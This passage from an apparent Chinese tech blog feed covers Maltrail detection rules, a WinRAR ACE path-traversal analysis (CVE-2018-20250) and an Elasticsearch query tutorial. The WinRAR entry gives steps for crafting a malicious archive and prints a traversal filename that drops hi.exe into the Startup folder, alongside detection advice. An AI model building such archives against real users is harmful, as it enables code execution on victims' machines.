<span class="hljs-string">&quot;/gwx/&quot;</span>)<br><br>SUSPICIOUS_HTTP_REQUEST_PRE_CONDITION = (<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;.ht&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p>8.如果文件后缀名在可疑列表中且下载路径不在白名单之中并且请求中不包含“=”且文件名长度小于10个字符 - direct %s download (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_DIRECT_DOWNLOAD_EXTENSIONS = <span class="hljs-built_in">set</span>((<span class="hljs-string">&quot;.apk&quot;</span>, <span class="hljs-string">&quot;.chm&quot;</span>, <span class="hljs-string">&quot;.egg&quot;</span>, <span class="hljs-string">&quot;.exe&quot;</span>, <span class="hljs-string">&quot;.hta&quot;</span>, <span class="hljs-string">&quot;.hwp&quot;</span>, <span class="hljs-string">&quot;.pac&quot;</span>, <span class="hljs-string">&quot;.ps1&quot;</span>, <span class="hljs-string">&quot;.scr&quot;</span>, <span class="hljs-string">&quot;.sct&quot;</span>))<br><br>WHITELIST_DIRECT_DOWNLOAD_KEYWORDS = (<span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;/scripts/&quot;</span>, <span class="hljs-string">&quot;/_vti_bin/&quot;</span>, <span class="hljs-string">&quot;/bin/&quot;</span>, <span class="hljs-string">&quot;/pub/softpaq/&quot;</span>, <span class="hljs-string">&quot;/bios/&quot;</span>, <span class="hljs-string">&quot;/pc-axis/&quot;</span>)<br></code></pre></td></tr></table></figure><p>9.如果文件名在 webshell 列表中 - potential web shell (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WEB_SHELLS 是一个<span class="hljs-built_in">set</span>()，在程序运行时动态添加<br></code></pre></td></tr></table></figure><p>10.如果文件名符合以下正则表达式 - (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_HTTP_PATH_REGEXES = ((<span class="hljs-string">&quot;non-existent page&quot;</span>, <span class="hljs-string">r&quot;defaultwebpage\.cgi&quot;</span>), (<span class="hljs-string">&quot;potential web scan&quot;</span>, <span class="hljs-string">r&quot;inexistent_file_name\.inexistent|test-for-some-inexistent-file|long_inexistent_path|some-inexistent-website\.acu&quot;</span>))<br></code></pre></td></tr></table></figure><p>11.以下内容全部为 DNS 协议启发式检测，源码注释表示引用自 <a href="http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf">此文章</a>，但目前已经无法访问。与之相关的判定逻辑较为复杂，难以描述清楚，可以在 sensor.py 中以下面的关键字自行查看：</p><ol><li>potential dns exhaustion (suspicious)</li><li>sinkholed by %s (malware)</li><li>parked site (suspicious)</li><li>excessive no such domain (suspicious)</li><li>consonant threshold no such domain (suspicious)</li><li>entropy threshold no such domain (suspicious)</li></ol><p><strong>参考资料：</strong><br><a href="https://github.com/stamparm/maltrail#real-life-cases">README.md - Real-life cases</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>流量检测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>Maltrail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WinRAR 目录穿越漏洞（CVE-2018-2025[0-3]）</title>
    <link href="/post/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/"/>
    <url>/post/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Check Point 团队爆出了一个关于 WinRAR 存在 19 年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用 WinRAR 解压该恶意文件时便会触发漏洞。</p><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库 UNACEV2.dll 所造成的，动态链接库的作用是处理 ACE  格式文件。而 WinRAR 解压ACE文件时，由于没有对文件名进行充分过滤，导致存在目录穿越漏洞，允许解压过程将恶意文件写入任意目录，甚至 <strong>写入开机启动项</strong>，导致代码执行。</p><p>由于 UNACEV2.dll 动态链接库还被市面上一些支持 <strong>.ace 格式文件</strong> 的解压缩软件所使用，因此除 WinRAR 之外的众多压缩工具、文件管理工具，可能也会存在相同的代码执行风险。</p><p>WinRAR 代码执行相关的 CVE 编号如下：</p><blockquote><p>CVE-2018-20250, CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</p></blockquote><table><thead><tr><th>漏洞名称</th><th>CVE编号</th><th>描述</th></tr></thead><tbody><tr><td>ACE文件验证逻辑绕过漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250">CVE-2018-20250</a></td><td>In WinRAR versions prior to and including 5.61, There  is path traversal vulnerability when crafting the filename field of the  ACE format (in UNACEV2.dll). When the filename field is manipulated  with specific patterns, the destination (extraction) folder is ignored,  thus treating the filename as an absolute path. 在WinRAR 5.61之前的版本中，创建ACE格式文件的filename时存在路径穿越漏洞（在UNACEV2.dll中）。当使用特定的模式操作filename时，解压时将忽略目标（提取）文件路径，而将文件名视为绝对路径进行提取。</td></tr><tr><td>ACE文件名逻辑验证绕过漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20251">CVE-2018-20251</a></td><td>In WinRAR versions prior to and including 5.61, there  is path traversal vulnerability when crafting the filename field of the  ACE format. The UNACE module (UNACEV2.dll) creates files and folders as  written in the filename field even when WinRAR validator noticed the  traversal attempt and requestd to abort the extraction process. the  operation is cancelled only after the folders and files were created but  prior to them being written, therefore allowing the attacker to create  empty files and folders everywhere in the file system. 在WinRAR 5.61之前的版本中，创建ACE格式文件的filename时存在路径穿越漏洞。UNACEV2.dll按照filename中写入的内容创建文件和文件夹，即使WinRAR校验器注意到目录穿越尝试并请求中止提取过程，只有在创建了文件夹和文件之后（写入内容之前）操作才会被取消，因此允许攻击者在文件系统的任何地方创建空文件和空文件夹。</td></tr><tr><td>ACE/RAR文件越界写入漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20252">CVE-2018-20252</a></td><td>In WinRAR versions prior to and including 5.60, there  is an out-of-bounds write vulnerability during parsing of crafted ACE  and RAR archive formats. Successful exploitation could lead to arbitrary  code execution in the context of the current user. 在WinRAR 5.60之前的版本中，对ACE和RAR格式文件进行解析时，存在越界写入漏洞，成功利用可能导致在当前用户的上下文中执行任意代码。</td></tr><tr><td>LHA/LZH文件越界写入漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20253">CVE-2018-20253</a></td><td>In WinRAR versions prior to and including 5.60, There  is an out-of-bounds write vulnerability during parsing of a crafted LHA  / LZH archive formats. Successful exploitation could lead to arbitrary  code execution in the context of the current user. 在WinRAR 5.60之前的版本中，对LHA和LZH格式文件时进行解析时，存在越界写入漏洞，成功利用可能导致在当前用户的上下文中执行任意代码。</td></tr></tbody></table><p>参考链接：<a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=WinRAR">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=WinRAR</a></p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><ol><li>发布时间早于 5.70 Beta 1 版本的所有 WinRAR 软件；</li><li>使用 UNACEV2.dll 动态链接库的解压、文件管理类工具软件，如：</li></ol><blockquote><p>Bandizip &lt; = 6.2.0.0<br>好压(2345 压缩) &lt; = 5.9.8.10907<br>360压缩 &lt; = 4.0.0.1170</p></blockquote><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>方式一：使用开源 <a href="https://github.com/WyAtu/CVE-2018-20250">EXP</a> 生成压缩格式为 ace 的恶意 rar 文件。</p><p>方式二：手动创建恶意ace文件（具体见 <a href="https://www.cnblogs.com/fox-yu/p/10495236.html%EF%BC%89">https://www.cnblogs.com/fox-yu/p/10495236.html）</a></p><ol><li>使用 WinACE 创建一个 ace 文件；</li><li>使用 <a href="https://pypi.org/project/acefile/">acefile</a> 查看该文件头部信息；</li><li>使用 WinHex 修改文件解压缩路径；</li><li>同时修改 hdr_size 以及 hdr_crc 以及路径长度；</li><li>再用 acefile 校验修改后的结果；</li><li>解压实现攻击。</li></ol><p><strong>利用测试（方式一）：</strong></p><p>利用开源的 exp 生成恶意 ace 压缩文件 test-exp.rar（其中包含3个文件，如图所示），右键解压到当前文件目录后，发现在本地生成了两个正常的 txt 文件，而在开始菜单的启动项中生成了一个hi.exe的可执行文件，目录穿越成功。</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572492070587.png"></p><p>文件解压时写入的实际路径如下：</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572491863075.png"></p><p><strong>漏洞利用条件：</strong></p><p>由于产生漏洞的DLL文件：UNACEV2.DLL，<strong>不能识别相对路径，只能识别绝对路径</strong>。因此攻击者在利用漏洞时需要硬编码写入一个相对于当前目录的一个绝对路径，比如：C:..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test.exe，并且<strong>攻击不能跨盘符</strong>。</p><p>因此攻击能否成功，需要取决于受害者进行解压文件触发漏洞时是否在系统盘，且在不知道计算机主机名的情况下，只能在主浏览器的默认下载路径下（C:\Users\Administrator\Downloads）或者桌面进行解压，或者多猜几个启动项路径。</p><h2 id="0x03-检测方案"><a href="#0x03-检测方案" class="headerlink" title="0x03 检测方案"></a>0x03 检测方案</h2><ol><li>读取压缩文件的十六进制内容，根据头部特征判断是否为 ACE 格式文件；</li><li>读取压缩文件的十六进制内容，识别其默认解压路径（filename）是否为绝对路径（以 ASCII 字符形式存在，中文会出现乱码）；</li><li>读取压缩文件的十六进制内容，识别其默认解压路径（filename）是否包含有敏感路径；</li><li>读取压缩文件的十六进制内容，识别其中是否包含有可执行文件。</li></ol><h3 id="ACE-文件特征头部"><a href="#ACE-文件特征头部" class="headerlink" title="ACE 文件特征头部"></a>ACE 文件特征头部</h3><p>在 WinHex 中以十六进制查看 ACE 文件头部。</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570377743.png" alt="正常ace文件test1.ace"></p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570416878.png" alt="正常ace文件test2.ace"></p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570444750.png" alt="上文构造的恶意ace文件test-exp.rar"></p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> ACE 文件特征头部<br>HEX：<span class="hljs-number">31000000902</span>A2A4143452A2A14140200<br>ASCII：<span class="hljs-number">1</span>    **ACE**    <br></code></pre></td></tr></table></figure><h3 id="ACE-文件中存在的目的路径及文件名"><a href="#ACE-文件中存在的目的路径及文件名" class="headerlink" title="ACE 文件中存在的目的路径及文件名"></a>ACE 文件中存在的目的路径及文件名</h3><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572490956434.png" alt="上文构造的恶意ace文件test-exp.rar"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">// filename字段值<br>HEX：433A5C433A433A2E2E2F417070446174615C526F616D696E675C4D6963726F736F66745C57696E646F77735C5374617274204D656E755C50726F6772616D735C537461727475705C68692E657865<br>ASCII：<br>C:<span class="hljs-symbol">\C</span>:C:../AppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<span class="hljs-symbol">\h</span>i.exe<br><br>// filename头部起始标志位<br>HEX：0A005445XX00<br></code></pre></td></tr></table></figure><p><strong>检测方式：是否为绝对路径 + 是否为开机自启动路径 + 是否包含可执行文件后缀名。</strong></p><p>一些 Windows 版本的自启动路径如下：</p><blockquote><p>Win2003 开机启动项路径：C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</p><p>Win2008 开机启动项路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win2012 开机启动项路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win7 开机启动项路径：C:\Users\用户\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win8.1 开机启动项路径：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>Win10 开机启动项路径：C:\Users\用户\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></blockquote><p>除 Win 2003 中文版外共有的启动路径特征：<strong>\Microsoft\Windows\Start Menu\Programs\Startup</strong></p><p><strong>参考文章：</strong><br>漏洞的详细分析：<a href="https://xz.aliyun.com/t/4221">https://xz.aliyun.com/t/4221</a><br>攻击利用方式：<a href="https://www.freebuf.com/column/201214.html">https://www.freebuf.com/column/201214.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WinRAR</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何正确使用 ES 搜索引擎——查询</title>
    <link href="/post/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8ES%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/"/>
    <url>/post/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8ES%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<p>Elasticsearch 是一个使用 Java 编写的开源搜索引擎，建立在全文搜索引擎库 <a href="https://lucene.apache.org/core/">Apache Lucene™</a> 基础之上，它的内部使用 Lucene 做索引与搜索，但隐藏了 Lucene 的复杂性，取而代之的是将所有功能打包成一个单独的服务，可以通过程序与它提供的一套简单的 RESTful API 进行通信。</p><h2 id="查询表达式（query）"><a href="#查询表达式（query）" class="headerlink" title="查询表达式（query）"></a>查询表达式（query）</h2><p>查询表达式（Query DSL）是一种非常灵活的查询语言，es 使用它以简单的 json 接口来展现 Lucene 的绝大部分功能，要使用这种查询表达式，只需将查询语句传递给 <code>query</code> 参数：</p><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: YOUR_QUERY_HERE<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="query-DSL"><a href="#query-DSL" class="headerlink" title="query DSL"></a>query DSL</h3><p>在查询上下文中，查询会回答这个问题——<strong>“这个文档匹不匹配这个查询，它的相关度高吗？”</strong></p><p>如何验证匹配很好理解，如何计算相关度呢？es 中索引的数据都会存储一个 _score 分值，分值越高就代表越匹配。另外关于某个搜索的分值计算还是很复杂的，因此也需要一定的时间。</p><h3 id="filter-DSL"><a href="#filter-DSL" class="headerlink" title="filter DSL"></a>filter DSL</h3><p>在过滤器上下文中，查询会回答这个问题——<strong>“这个文档匹不匹配？”</strong></p><p>答案很简单，是或者不是。它不会去计算任何分值，也不会关心返回的排序问题，因此效率会高一点。另外，经常使用过滤器，es 会自动的缓存过滤器的内容，会提高很多查询的性能。</p><h2 id="查询请求结果"><a href="#查询请求结果" class="headerlink" title="查询请求结果"></a>查询请求结果</h2><h3 id="hits"><a href="#hits" class="headerlink" title="hits"></a>hits</h3><p>返回结果中最重要的部分是 <code>hits</code> ，它包含 <code>total</code> 字段来表示匹配到的文档总数，并且一个 <code>hits</code> 数组包含所查询结果的前十个文档。在 <code>hits</code> 数组中每个结果包含文档的 <code>_index</code> 、 <code>_type</code> 、 <code>_id</code> ，加上 <code>_source</code> 字段，这意味着我们可以直接从返回的搜索结果中使用整个文档，而不像其他的搜索引擎，仅仅返回文档的 ID。每个结果还有一个 <code>_score</code> ，它衡量了文档与查询的匹配程度，<code>max_score</code> 表示与查询所匹配文档的 <code>_score</code> 的最大值。</p><h3 id="took"><a href="#took" class="headerlink" title="took"></a>took</h3><p><code>took</code> 值告诉我们执行整个搜索请求耗费了多少 <strong>毫秒</strong>。</p><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><p><code>timed_out</code> 值告诉我们查询是否超时。默认情况下，搜索请求不会超时。如果低响应时间比完成结果更重要，你可以指定 <code>timeout</code> 为 10ms 或者 1s。在请求超时之前，es 将会返回已经成功从每个分片获取的结果。</p><h3 id="shards"><a href="#shards" class="headerlink" title="shards"></a>shards</h3><p><code>_shards</code> 部分告诉我们在查询中参与分片的总数，以及这些分片成功了多少个失败了多少个。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 这是查询返回的结果</span><br>&#123;<br>   <span class="hljs-string">&quot;took&quot;</span>: <span class="hljs-number">2</span>,  <span class="hljs-comment">// 执行整个搜索请求耗费了多少毫秒</span><br>   <span class="hljs-string">&quot;timed_out&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// 查询是否超时</span><br>   <span class="hljs-string">&quot;_shards&quot;</span>: &#123;  <span class="hljs-comment">// 查询中参与分片的总数，以及这些分片成功了多少个失败了多少个</span><br>      <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-string">&quot;successful&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-string">&quot;skipped&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-string">&quot;failed&quot;</span>: <span class="hljs-number">0</span><br>   &#125;,<br>   <span class="hljs-string">&quot;hits&quot;</span>: &#123;  <span class="hljs-comment">// 所有查询到的结果</span><br>      <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">1008</span>,  <span class="hljs-comment">// 表示匹配到的文档总数</span><br>      <span class="hljs-string">&quot;max_score&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 结果中最大的评分</span><br>      <span class="hljs-string">&quot;hits&quot;</span>: [<br>         &#123;<br>            <span class="hljs-string">&quot;_index&quot;</span>: <span class="hljs-string">&quot;bank&quot;</span>,  <span class="hljs-comment">// 索引名称</span><br>            <span class="hljs-string">&quot;_type&quot;</span>: <span class="hljs-string">&quot;account&quot;</span>,  <span class="hljs-comment">// type 名称</span><br>            <span class="hljs-string">&quot;_id&quot;</span>: <span class="hljs-string">&quot;25&quot;</span>,  <span class="hljs-comment">// id 名称</span><br>            <span class="hljs-string">&quot;_score&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 评分</span><br>            <span class="hljs-string">&quot;_source&quot;</span>: &#123;  <span class="hljs-comment">// 存储的数据源信息</span><br>               <span class="hljs-string">&quot;account_number&quot;</span>: <span class="hljs-number">25</span>,<br>               <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">40540</span>,<br>               <span class="hljs-string">&quot;firstname&quot;</span>: <span class="hljs-string">&quot;Virginia&quot;</span>,<br>               <span class="hljs-string">&quot;lastname&quot;</span>: <span class="hljs-string">&quot;Ayala&quot;</span>,<br>               <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">39</span>,<br>               <span class="hljs-string">&quot;gender&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>,<br>               <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;171 Putnam Avenue&quot;</span>,<br>               <span class="hljs-string">&quot;employer&quot;</span>: <span class="hljs-string">&quot;Filodyne&quot;</span>,<br>               <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;virginiaayala@filodyne.com&quot;</span>,<br>               <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;Nicholson&quot;</span>,<br>               <span class="hljs-string">&quot;state&quot;</span>: <span class="hljs-string">&quot;PA&quot;</span><br>            &#125;<br>         &#125;<br>      ]<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="多索引，多类型"><a href="#多索引，多类型" class="headerlink" title="多索引，多类型"></a>多索引，多类型</h2><ul><li><p><code>/_search</code> </p><p>在所有的索引中搜索所有的类型 </p></li><li><p><code>/gb/_search</code> </p><p>在 <code>gb</code> 索引中搜索所有的类型 </p></li><li><p><code>/gb,us/_search</code> </p><p>在 <code>gb</code> 和 <code>us</code> 索引中搜索所有的文档 </p></li><li><p><code>/g*,u*/_search</code> </p><p>在任何以 <code>g</code> 或者 <code>u</code> 开头的索引中搜索所有的类型 </p></li><li><p><code>/gb/user/_search</code> </p><p>在 <code>gb</code> 索引中搜索 <code>user</code> 类型 </p></li><li><p><code>/gb,us/user,tweet/_search</code> </p><p>在 <code>gb</code> 和 <code>us</code> 索引中搜索 <code>user</code> 和 <code>tweet</code> 类型 </p></li><li><p><code>/_all/user,tweet/_search</code> </p><p>在所有的索引中搜索 <code>user</code> 和 <code>tweet</code> 类型 </p></li></ul><h2 id="分页（from、size）"><a href="#分页（from、size）" class="headerlink" title="分页（from、size）"></a>分页（from、size）</h2><ul><li><p><code>from</code></p><p>​    显示应该跳过的初始结果数量，默认是 <code>0</code> </p></li><li><p><code>size</code></p><p>​    显示应该返回的结果数量，默认是 <code>10</code> </p></li></ul><p>可以同时使用 <code>from</code> 和 <code>size</code> 参数来分页：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>  <span class="hljs-string">&quot;from&quot;</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">10</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="精确值查找（term，terms）"><a href="#精确值查找（term，terms）" class="headerlink" title="精确值查找（term，terms）"></a>精确值查找（term，terms）</h2><h3 id="查找单个精确值"><a href="#查找单个精确值" class="headerlink" title="查找单个精确值"></a>查找单个精确值</h3><p>可以用 <code>term</code> 处理数字、布尔值、日期、以及文本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值为 $20 的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123; <br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;term&quot;</span>: &#123; <br>                    <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">20</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="查找多个精确值"><a href="#查找多个精确值" class="headerlink" title="查找多个精确值"></a>查找多个精确值</h3><p><code>term</code> 查询对于查找单个值非常有用，但如果我们想要搜索多个值该如何处理呢？不需要使用多个 <code>term</code> 查询，我们只要用单个 <code>terms</code> 查询，<code>terms</code> 允许指定多个匹配条件，除此之外它几乎与 <code>term</code> 的使用方式一模一样，我们只要将 <code>term</code> 字段的值改为数组即可：</p><p>它几乎与 <code>term</code> 的使用方式一模一样，与指定单个价格不同，我们只要将 <code>term</code> 字段的值改为数组即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 查找价格字段值为 $20 或 $30 的文档</span><br>GET /my_store/products/_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;terms&quot;</span>: &#123; <br>                    <span class="hljs-string">&quot;price&quot;</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">30</span>]<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当进行精确值查找时，请尽可能多的使用 <strong>过滤式查询（filters）</strong>，过滤器很重要，因为它们执行速度非常快（不会计算相关度，而且可以被缓存）。</p><p>当我们不关心 TF/IDF 对搜索结果排序的影响，只想知道一个词是否在某个字段中出现过时，可以使用 <code>constant_score</code> 将 <code>query</code> 查询语句或者 <code>filter</code> 过滤语句包装起来，同时可以使用 <code>boost</code> 指定权重：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 忽略 TF/IDF</span><br>GET /_search<br>&#123;<br>  <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;bool&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;should&quot;</span>: [<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;wifi&quot;</span> &#125;&#125;<br>        &#125;&#125;,<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span class="hljs-string">&quot;match&quot;</span>: &#123; <span class="hljs-string">&quot;features&quot;</span>: <span class="hljs-string">&quot;garden&quot;</span> &#125;&#125;<br>        &#125;&#125;,<br>        &#123; <span class="hljs-string">&quot;constant_score&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;boost&quot;</span>: <span class="hljs-number">2</span>  <span class="hljs-comment">// pool 语句的权重提升值为 2 ，而其他的语句为 1</span><br>          <span class="hljs-string">&quot;query&quot;</span>: &#123; <span 